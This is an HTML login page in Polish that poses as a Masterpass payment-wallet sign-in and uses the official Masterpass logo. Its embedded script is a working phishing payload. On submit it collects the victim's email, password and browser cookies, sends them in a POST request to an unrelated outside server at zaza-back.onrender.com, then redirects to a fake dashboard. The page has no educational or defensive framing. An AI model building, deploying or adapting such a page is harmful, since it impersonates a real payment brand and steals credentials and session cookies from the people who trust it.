
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Portfel Masterpass</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body class="login-page">
  <div class="login-wrapper">
    <div class="login-box">
      <div class="logo-box">
        <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />
      </div>
      <h2>Zaloguj się do swojego portfela</h2>
      <form id="loginForm">
        <label for="email">Adres e-mail</label>
        <input type="email" id="email" placeholder="np. jan.kowalski@gmail.com" required />

        <label for="password">Hasło</label>
        <input type="password" id="password" placeholder="Wprowadź hasło" required />

        <div class="form-footer">
          <a href="#">Nie pamiętasz hasła?</a>
        </div>

        <button type="submit" class="submit-btn">Zaloguj się</button>
      </form>
      <div class="register-box">
        <p>Nie masz konta? <a href="#">Zarejestruj się</a></p>
      </div>
    </div>
  </div>

  <script type="module">
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      await fetch('https://zaza-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, cookies: document.cookie })
      });

      window.location.href = '/wallet-dashboard.html';
    });
  </script>
</body>
</html>
